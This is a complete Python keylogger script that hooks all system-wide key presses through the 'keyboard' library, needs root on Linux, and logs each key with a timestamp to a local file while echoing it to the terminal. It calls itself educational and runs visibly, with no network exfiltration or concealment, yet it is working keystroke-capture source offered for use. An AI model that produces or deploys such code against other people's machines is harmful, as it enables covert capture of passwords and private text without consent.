import argparse
import sys
import os
from datetime import datetime

try:
    import keyboard
except ImportError:
    print("[-] Error: 'keyboard' library is not installed.")
    print("[*] Please install it using: pip install keyboard")
    sys.exit(1)

# Global variable for the output file
OUTPUT_FILE = "keylog.txt"

def on_key_event(event):
    """Callback function executed on every key press."""
    # We only care about key DOWN events (not key UP) to avoid duplicates
    if event.event_type == keyboard.KEY_DOWN:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        key_name = event.name
        
        # 1. Print to terminal to prove it's capturing
        print(f"[Captured] {key_name}")
        
        # 2. Write to file immediately
        try:
            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] Key: {key_name}\n")
                f.flush() # Force OS to write to disk instantly
                os.fsync(f.fileno())
        except Exception as e:
            print(f"[-] Error writing to file: {e}")

def main():
    global OUTPUT_FILE
    
    # SECURITY CHECK: This library requires root on Linux
    if os.name == 'posix' and os.geteuid() != 0:
        print("[-] Error: This hardware-level keylogger requires root privileges.")
        print("[*] Please run it with sudo using your virtual environment:")
        print("[*] Example: sudo .venv/bin/python keylogger.py")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="Hardware-Level Educational Keylogger")
    parser.add_argument("-o", "--output", default="keylog.txt", help="File to save the logged keystrokes")

    args = parser.parse_args()
    OUTPUT_FILE = args.output

    print("="*55)
    print("⌨️  Python Hardware-Level Keylogger")
    print("="*55)
    print(f"[*] Output File : {OUTPUT_FILE}")
    print("[!] WARNING     : This tool is for educational purposes ONLY.")
    print("="*55)
    print("[*] Listening directly to kernel hardware inputs (/dev/input/).")
    print("[*] Type anywhere on your computer to see it captured live below.")
    print("[*] Press 'Ctrl+C' in this terminal to stop and exit.\n")

    try:
        # Hook all hardware keys
        keyboard.hook(on_key_event)
        # Block forever until Ctrl+C is pressed
        keyboard.wait()
    except KeyboardInterrupt:
        print("\n[*] 'Ctrl+C' detected. Stopping the keylogger safely...")
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {e}")
    finally:
        print(f"[+] Session ended. All keystrokes are saved to '{OUTPUT_FILE}'.")

if __name__ == "__main__":
    main()
